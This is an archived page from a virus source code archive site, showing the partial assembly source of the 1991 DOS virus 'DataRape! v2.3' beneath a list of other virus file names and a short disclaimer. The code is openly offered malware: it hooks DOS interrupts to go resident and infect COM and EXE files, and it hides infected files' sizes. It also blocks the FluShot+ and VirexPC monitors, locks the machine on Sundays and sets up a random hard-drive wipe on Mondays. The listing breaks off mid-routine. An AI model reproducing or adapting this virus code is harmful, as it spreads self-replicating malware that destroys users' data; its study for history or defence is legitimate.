<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: datarp23_asm</title>
<meta name="KEYWORDS" content="datarp23.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for datarp23.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

@b      macro   char
        mov     ah,0eh
        mov     al,char
        int     10h
endm
;---
; DataRape! v2.3 Source Code
;
; Written by Zodiac and Data Disruptor
;
; (C) 1991 RABID International Development Corp
; (Aug.14.91)
;---
;
; Note: Assuming that and infected COMMAND.COM was booted, FSP/VirexPC will
;       not be able to go resident under this version of DataRape!
;
;---

code         segment
	     assume     cs:code,ds:code,es:code

v:                                      ; All Pre-Resident Offsets Based
					; upon this location

startup:
	     call       relative
relative:
	     pop        si
	     sub        si,offset relative
	     mov        bp,si
	     cld

	     push       ax                      ;
	     push       es                      ; Saves registers
	     push       si                      ;
	     push       ds                      ;
             mov        ah,2ah                  ; Get system time
             int        21h
             cmp        al,0
             jne        are_we_here_boost
             jmp        its_sunday

are_we_here_boost:
             jmp   are_we_here

;---
; If it's Sunday, then we display a message and lock the system
;---
its_sunday:
             mov        ah,01h
             mov        cx,2020h
             int        10h                     ;NUL the cursor

             mov        ah,02h                  ;Moves the cursor
             xor        dx,dx
             int        10h

             xor        ax,ax                   ;Clears the screen
             int        10h

             @b         "I"
             @b         "t"
             @b         "'"
             @b         "s"
             @b         " "
             @b         "S"
             @b         "u"
             @b         "n"
             @b         "d"
             @b         "a"
             @b         "y"
             @b         "."
             @b         " "
             @b         "W"
             @b         "h"
             @b         "y"
             @b         " "
             @b         "a"
             @b         "r"
             @b         "e"
             @b         " "
             @b         "y"
             @b         "o"
             @b         "u"
             @b         " "
             @b         "w"
             @b         "o"
             @b         "r"
             @b         "k"
             @b         "i"
             @b         "n"
             @b         "g"
             @b         "?"
             @b         13
             @b         10
             @b         "T"
             @b         "a"
             @b         "k"
             @b         "e"
             @b         " "
             @b         "t"
             @b         "h"
             @b         "e"
             @b         " "
             @b         "d"
             @b         "a"
             @b         "y"
             @b         " "
             @b         "o"
             @b         "f"
             @b         "f"
             @b         " "
             @b "c"
             @b "o"
             @b "m"
             @b "p"
             @b "l"
             @b "i"
             @b "m"
             @b "e"
             @b "n"
             @b "t"
             @b "s"
             @b " "
             @b "o"
             @b "f"
             @b " "
             @b "R"
             @b "A"
             @b "B"
             @b "I"
             @b "D"
             @b 7


im_looped:   jmp        im_looped

are_we_here:
             mov	ax,6969h                ; Check to see if we are
	     int	21h                     ; Allready resident
	     cmp	bx,6969h
	     je	        already_here            ; Yes? Then leave the program
	     jmp	after_trish

db	     13,10,'Patricia Boon',13,10

after_trish:
	     xor        ax,ax                               ;
	     mov        ds,ax                               ; Loads Current
	     les        ax,ds:[21h*4]                       ; Int 21h Vector
	     mov        word ptr cs:[si+save_int_21],ax     ;
	     mov        word ptr cs:[si+save_int_21+2],es   ;
             push       cs
             pop        ds
             jmp        load_mem
already_here:
	     pop        es                                  ; If, exit
go_go_program:                                              ;
	     jmp        go_program                          ;

exit_exe:
	     mov        bx,es                               ;
	     add        bx,10h                              ; E
	     add        bx,word ptr cs:[si+call_adr+2]      ; X
	     mov        word ptr cs:[si+patch+2],bx         ; E
	     mov        bx,word ptr cs:[si+call_adr]        ;
	     mov        word ptr cs:[si+patch],bx           ; E
	     mov        bx,es                               ; X
	     add        bx,10h                              ; I
	     add        bx,word ptr cs:[si+stack_pointer+2] ; T
	     mov        ss,bx                               ; I
	     mov        sp,word ptr cs:[si+stack_pointer]   ; N
	     db         0eah                                ; G
patch:                                                      ;
	     dd         0                                   ;
      
; Below should be changed to:
; exit_com: xor bx,bx
;           push bx
;           mov di,100h
;           push di
;           add si,offset my_save
;           movsb
;           movsw
;           ret

exit_com:
	     mov        di,100h                             ; EXIT
	     add        si,offset my_save                   ; COM
	     movsb                                          ;
	     movsw                                          ;
	     xor        bx,bx                               ;
	     push       bx                                  ;
	     jmp        [si-11]                             ;

;---
; Here is where we load ourselves into memory
;---

load_mem:
	     pop        es
	     mov        ah,49h                  ; Release memory
	     int        21h
	     mov        bx,0ffffh               ; Set memory for FFFFh
                                                ; paragraphs
	     mov        ah,48h                  ; Allocate memory for
                                                ; ourselves
	     int        21h
	     sub        bx,(top_bz+my_bz+1ch-1)/16+2
	     jc         go_go_program
	     mov        cx,es
	     stc
	     adc        cx,bx
	     mov        ah,4ah                  ; Modify memory allocation
	     int        21h
	     mov        bx,(offset top_bz+offset my_bz+1ch-1)/16+1
	     stc
	     sbb        es:[2],bx
	     push       es
	     mov        es,cx
	     mov        ah,4ah
	     int        21h
	     mov        ax,es
	     dec        ax
	     mov        ds,ax
	     mov        word ptr ds:[1],8
	     call       mul_16
	     mov        bx,ax
	     mov        cx,dx
	     pop        ds
	     mov        ax,ds
	     call       mul_16
	     add        ax,ds:[6]
	     adc        dx,0
	     sub        ax,bx
	     sbb        dx,cx
	     jc         mem_ok
	     sub        ds:[6],ax            ; This section look familiar?
mem_ok:
	     pop        si
	     push       si
	     push       ds
	     push       cs
	     xor        di,di
	     mov        ds,di
	     lds        ax,ds:[27h*4]
	     mov        word ptr cs:[si+save_int_27],ax
	     mov        word ptr cs:[si+save_int_27+2],ds
	     pop        ds
	     mov        cx,offset aux_size
	     rep        movsb
	     xor        ax,ax
	     mov        ds,ax
	     mov        ds:[21h*4],offset int_21
	     mov        ds:[21h*4+2],es
	     mov        ds:[27h*4],offset int_27
	     mov        ds:[27h*4+2],es
	     mov        word ptr es:[filehndl],ax
	     pop        es
go_program:
             mov        ah,30h                  ; Get DOS version number
             int        21h
             cmp        al,4                    ;
             jae        check_date              ; If >= 4 then check the date
             jmp        no_fry                  ; NOT?! Then continue with
                                                ; virus
check_date:  mov        ah,2ah                  ; Get system time
             int        21h
             cmp        al,1                    ; Is it a monday?
             je         randomizer
             jmp        no_fry
;---
; If we actually get here, then we have a one in 15 chance that we will fry
; the hard-drive. You may ask yourself, "Why do you go through all the
; trouble?". Easy, because the main priority here is spreading, and not
; fucking up data...
;---

randomizer:
             mov        ah,2ch                  ; Get system time
             int        21h
             and        dl,0fh
             or         dl,dl
             jnz        no_fry
             jmp        write_short

no_fry:      pop        si                      ; Restore registers
	     pop        ds
	     pop        ax
	     cmp        word ptr cs:[si+my_save],5a4dh ; Is it an EXE file?
	     jne        go_exit_com             ; No? Then must be a COM file.
	     jmp        exit_exe                ; Yes! Exit an EXE file
go_exit_com:
	     jmp        exit_com

int_27:
	     pushf                                      ; Allocates Memory,
	     call       alloc                           ; So TSR can load
	     popf                                       ;
	     jmp        dword ptr cs:[save_int_27]      ;

;---
; This routine will return our ID byte in BX if we are resident.
;---
weare_here:
	     popf
	     xor        ax,ax
	     mov        bx,6969h                        ; ID Register
	     iret
     
int_21:
	     push       bp
	     mov        bp,sp
	     push       [bp+6]
	     popf
	     pop        bp                              ; Set Up Stack

	     pushf                                      ; Save Flag
	     cld
	     cmp        ax,6969h
	     je         weare_here

	     cmp        ah,11h                          ; Hide In
	     jb         not_hide                        ; Directory
	     cmp        ah,12h                          ; Listing
	     ja         not_hide                        ;
fcb_find:
	      call      dword ptr cs:[save_int_21]
	      push      ax
	      push      bx
	      push      ds
	      push      es
	      pushf

	      cmp       al,0FFh
	      je        done_hide                      ; Not There?

	      mov       ah,2Fh
	      int       21h                            ; Get Size
	      push      es
	      pop       ds
	      cmp       byte ptr es:[bx],0FFh          ; Extended FCB?
	      jne       not_extended
	      add       bx,7
not_extended:
	      mov       ax,es:[bx+17h]
	      and       ax,1Fh
	      cmp       ax,1Fh                         ; Check Time Stamp

;--
; Checking to see if the file is with a 62 seconds filestamp...
;--

	      jne       done_hide               ; No? Then the file is not
						; infected. Leave it alone...

;--
; If we get here, then we've deduced that the file is indeed infected.
; Therefore, we must reduce the filesize from the DTA in order to show that it
; is "not infected"
;--
	      sub       word ptr es:[bx+1Dh],offset top_file
	      sbb       word ptr es:[bx+1Dh+2],0       ; Decrease Size

;---
; Finished hiding, restore the resigers we saved, and return to the INT
; whence we came from...
;---

done_hide:
	      popf
	      pop       es
	      pop       ds
	      pop       bx
	      pop       ax
	      iret

;--
; Function differentiation happens here...
;--

directory:
         jmp   fcb_find

weare_here_boost:
         jmp     weare_here

;---
; If FluShot+ or VirexPC are trying to go resident, then tell them that
; we "allready are" resident
;---

fsp_trying:
         popf
         mov    ax,101h                   ;Set FSP/Virex ID byte
         iret

not_hide:
         cmp     ax,0ff0fh
         je      fsp_trying
         cmp     ah,3ch                  ; Are we creating a file?
         je      create
         cmp     ah,3dh                  ; Open file handle?
         je      touch
	 cmp     ah,3eh                  ; Are we closing a file?
	 je      close
         cmp     ah,43h                  ; Get/Set file attributes?
         je      touch
	 cmp     ax,4b00h                ; Are we executing a file?
	 je      touch
         cmp     ax,6969h                ; Checking if we are resident?
         je      weare_here_boost
	 cmp     ah,5bh                  ; Creating a file?
	 jne     not_create

create:
	     cmp        word ptr cs:[filehndl],0
	     jne        dont_touch
	     call       see_name
	     jnz        dont_touch
	     call       alloc
	     popf
	     call       function
	     jc         int_exit
	     pushf
	     push       es
	     push       cs
	     pop        es
	     push       si
	     push       di
	     push       cx
	     push       ax
	     mov        di,offset filehndl
	     stosw
	     mov        si,dx
	     mov        cx,65
move_name:
	     lodsb
	     stosb
	     test       al,al
	     jz         all_ok
	     loop       move_name
	     mov        word ptr es:[filehndl],cx
             jmp        all_ok

touch:
             jmp   try_infect

all_ok:
	     pop        ax
	     pop        cx
	     pop        di
	     pop        si
	     pop        es
go_exit:
	     popf
	     jnc        int_exit
close:
	     cmp        bx,word ptr cs:[filehndl]
	     jne        dont_touch
	     test       bx,bx
	     jz         dont_touch
	     call       alloc
	     popf
	     call       function
	     jc         int_exit
	     pushf
	     push       ds
	     push       cs
	     pop        ds
	     push       dx
	     mov        dx,offset filehndl+2
	     call       do_file
	     mov        word ptr cs:[filehndl],0
	     pop        dx
	     pop        ds
	     jmp        go_exit
not_create:
	     cmp        ah,3dh
	     je         touch
	     cmp        ah,43h
	     je         touch
	     cmp        ah,56h
	     jne        dont_touch
try_infect:
	     call       see_name
	     jnz        dont_touch
	     call       do_file
dont_touch:
	     call       alloc
	     popf
	     call       function
int_exit:
	     pushf
	     push       ds
	     call       get_chain
	     mov        byte ptr ds:[0],'Z'
	     pop        ds
	     popf
dummy        proc       far                             ; This is absolutely
	     ret        2                               ; needed, IRET
dummy        endp                                       ; doesn't cut it

see_name:
	     push       ax
	     push       si
	     mov        si,dx

;--
; Here's a crude yet effective way of scanning the file handle in order to see
; what type of file it is...
;
; (NOTE: We make up for crudeity later by checking the first two bytes of the
;  file to see if it is a COM or EXE file (4d5a))
;--

scan_name:
	     lodsb
	     test       al,al
	     jz         bad_name
	     cmp        al,'.'
	     jnz        scan_name
	     call       get_byte
	     mov        ah,al
	     call       get_byte
	     cmp        ax,'co'
	     jz         pos_com
	     cmp        ax,'ex'
	     jnz        good_name
	     call       get_byte
	     cmp        al,'e'
	     jmp        short good_name
pos_com:
	     call       get_byte
	     cmp        al,'m'
	     jmp        short good_name
bad_name:
	     inc        al
good_name:
	     pop        si
	     pop        ax
	     ret
      
get_byte:
	     lodsb
	     cmp        al,'C'
	     jc         byte_got
	     cmp        al,'Y'
	     jnc        byte_got
	     add        al,20h
byte_got:
	     ret
      
function:
	     pushf
	     call       dword ptr cs:[save_int_21]
	     ret
      
do_file:
	     push       ds
	     push       es
